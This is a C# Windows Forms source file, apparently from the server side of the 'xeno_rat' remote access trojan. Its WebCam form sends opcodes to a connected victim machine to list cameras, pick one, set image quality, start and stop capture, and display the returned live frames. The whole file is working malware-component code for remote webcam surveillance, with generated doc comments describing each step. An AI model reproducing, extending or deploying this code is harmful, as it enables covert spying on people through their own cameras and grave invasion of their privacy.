using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class WebCam : Form
    {
        Node client;
        Node ImageNode;
        bool playing = false;
        string[] Cameras;
        string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        public WebCam(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualitys);
            InitializeAsync();
        }

        /// <summary>
        /// Initializes the object asynchronously by creating an image node, adding temporary on disconnect, refreshing cameras, and starting the receive thread.
        /// </summary>
        /// <remarks>
        /// This method initializes the object asynchronously by performing the following tasks:
        /// 1. Creates an image node by awaiting the result of the <see cref="CreateImageNode"/> method.
        /// 2. Adds temporary on disconnect by invoking the <see cref="AddTempOnDisconnect"/> method on the created <see cref="ImageNode"/>.
        /// 3. Refreshes cameras by awaiting the result of the <see cref="RefreshCams"/> method.
        /// 4. Starts the receive thread by invoking the <see cref="RecvThread"/> method.
        /// </remarks>
        private async Task InitializeAsync() 
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshCams();
            RecvThread();
        }

        /// <summary>
        /// Asynchronously receives image data and updates the picture box with the received image.
        /// </summary>
        /// <remarks>
        /// This method continuously receives image data from the connected ImageNode and updates the picture box with the received image.
        /// If the received data is null, the method breaks the loop and stops receiving.
        /// If the application is in a playing state, the received image data is converted to an Image object and displayed in the picture box.
        /// The method uses asynchronous operations for receiving data to avoid blocking the main thread.
        /// </remarks>
        /// <exception cref="Exception">Thrown if there is an error in receiving or processing the image data.</exception>
        public async Task RecvThread()
        {
            while (ImageNode.Connected())
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {

                        Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = Image.FromStream(ms);
                        }
                        pictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (pictureBox1.Image != null)
                            {
                                pictureBox1.Image.Dispose();
                                pictureBox1.Image = null;
                            }
                            pictureBox1.Image = image;
                        }));
                    }
                    catch { }
                    //update picturebox
                }
            }
        }

        /// <summary>
        /// Refreshes the list of cameras and updates the UI accordingly.
        /// </summary>
        /// <remarks>
        /// This method asynchronously retrieves the list of available cameras using the <see cref="GetCamera"/> method.
        /// It then updates the UI by clearing the existing items in the <see cref="comboBox1"/> and adding the new camera names.
        /// If no cameras are available, it disables the <see cref="button2"/>; otherwise, it enables the button and sets the camera to the first available one using the <see cref="SetCamera"/> method.
        /// </remarks>
        /// <exception cref="Exception">
        /// An exception may be thrown if there is an error while retrieving the list of cameras or setting the camera.
        /// </exception>
        /// <returns>
        /// A task representing the asynchronous operation.
        /// </returns>
        public async Task RefreshCams()
        {
            string[] mics = await GetCamera();

            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(mics);
            if (mics.Length == 0)
            {
                button2.Enabled = false;
            }
            else
            {
                button2.Enabled = true;
                await SetCamera(0);
            }
        }

        /// <summary>
        /// Sets the camera with the specified index.
        /// </summary>
        /// <param name="index">The index of the camera to be set.</param>
        /// <exception cref="ArgumentNullException">Thrown when the client is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array opcode with value 1 to the client using an asynchronous send operation.
        /// Then it sends the index of the camera to the client using an asynchronous send operation after converting it to bytes.
        /// </remarks>
        public async Task SetCamera(int index)
        {
            byte[] opcode = new byte[] { 1 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(index));
        }

        /// <summary>
        /// Sets the quality of the client and sends the quality value to the server.
        /// </summary>
        /// <param name="quality">The quality value to be set for the client.</param>
        /// <remarks>
        /// This method sends an opcode to the server indicating that the quality is being set, followed by the quality value itself.
        /// The quality value is converted to bytes using the client's socket utility method before being sent to the server.
        /// </remarks>
        public async Task SetQuality(int quality)
        {
            byte[] opcode = new byte[] { 5 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(quality));
        }

        /// <summary>
        /// Asynchronously retrieves the list of cameras from the client and returns the result.
        /// </summary>
        /// <returns>An array of strings containing the list of cameras retrieved from the client.</returns>
        /// <remarks>
        /// This method sends a request to the client to retrieve the list of cameras and awaits the response.
        /// The response is then parsed to obtain the number of cameras, and individual camera names are received and stored in an array.
        /// The array of camera names is then assigned to the 'Cameras' property of the class and returned as the result.
        /// </remarks>
        public async Task<string[]> GetCamera()
        {
            byte[] opcode = new byte[] { 0 };
            await client.SendAsync(opcode);
            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[mics];
            for (int i = 0; i < mics; i++)
            {
                result[i] = Encoding.UTF8.GetString(await client.ReceiveAsync());
            }
            Cameras = result;
            return result;
        }

        /// <summary>
        /// Disconnects the client and image node if the provided node is equal to the client or the image node, and closes the form if not disposed.
        /// </summary>
        /// <param name="node">The node to be checked for disconnection.</param>
        /// <remarks>
        /// If the provided <paramref name="node"/> is equal to the client or the image node, this method disconnects the client and image node if it is not null.
        /// Additionally, if the form is not disposed, it is closed using <see cref="Control.BeginInvoke(Delegate)"/>.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Creates an image node and returns it. If the image node already exists, returns the existing node.
        /// </summary>
        /// <returns>The created or existing image node.</returns>
        /// <remarks>
        /// This method creates an image node if it does not already exist. If the image node already exists, it returns the existing node.
        /// The method sends a byte array with a value of 4 to the client asynchronously.
        /// It then creates a subnode asynchronously using the parent client and assigns it to the variable SubSubNode.
        /// The method sets the type and ID of the subnode using Utils.SetType2setIdAsync method and checks if the ID is not equal to -1.
        /// If the ID is not equal to -1, it returns the type and ID asynchronously using Utils.Type2returnAsync method and sends a byte array to the client.
        /// The method receives a byte array from the client and checks if it is null or the first element is 0. If so, it disconnects the subnode and returns null.
        /// If the ID is equal to -1, it disconnects the subnode and returns null.
        /// Finally, it returns the created or existing image node.
        /// </remarks>
        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            await client.SendAsync(new byte[] { 4 });
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Event handler for the form load event of the WebCam form.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method is called when the WebCam form is loaded. It can be used to initialize the form or perform any necessary setup.
        /// </remarks>
        private void WebCam_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Enables the next button and disables the current button, then sends a byte array with value 2 to the client asynchronously.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method enables the next button (<see cref="button3"/>) and disables the current button (<see cref="button2"/>).
        /// It also disables another button (<see cref="button1"/>).
        /// The method then sends a byte array with value 2 to the client asynchronously using the <see cref="client"/> object.
        /// The <see cref="playing"/> flag is set to true after sending the byte array.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false;//start
            button1.Enabled = false;
            //player.Start();
            await client.SendAsync(new byte[] { 2 });
            playing = true;
        }

        /// <summary>
        /// Disables the current button, enables the stop button, and sends a stop signal to the client.
        /// If an image is displayed in the picture box, it disposes of the image and sets it to null.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method disables the current button, enables the stop button, and sends a stop signal to the client.
        /// It also disposes of any image displayed in the picture box and sets it to null.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false;//stop
            button1.Enabled = true;
            //player.Stop();
            await client.SendAsync(new byte[] { 3 });
            playing = false;
            if (pictureBox1.Image != null)
            {
                pictureBox1.Image.Dispose();
                pictureBox1.Image = null;
            }
        }

        /// <summary>
        /// Asynchronously refreshes the cameras.
        /// </summary>
        /// <remarks>
        /// This method triggers the asynchronous refresh of the cameras, updating their status and properties.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshCams();
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox1.
        /// Sets the camera based on the selected index of comboBox1.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method asynchronously sets the camera based on the selected index of comboBox1.
        /// If the selected index is not -1, it awaits the SetCamera method with the selected index as the parameter.
        /// </remarks>
        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetCamera(selectedIndex);
            }
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox2.
        /// Sets the quality based on the selected index in the comboBox.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method retrieves the selected index from comboBox2 and sets the quality based on the selected index.
        /// It first checks if a valid index is selected, then it parses the quality value from the qualitys array and removes the '%' symbol.
        /// The SetQuality method is then called with the parsed quality value to set the quality.
        /// </remarks>
        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
            }
        }
    }
}
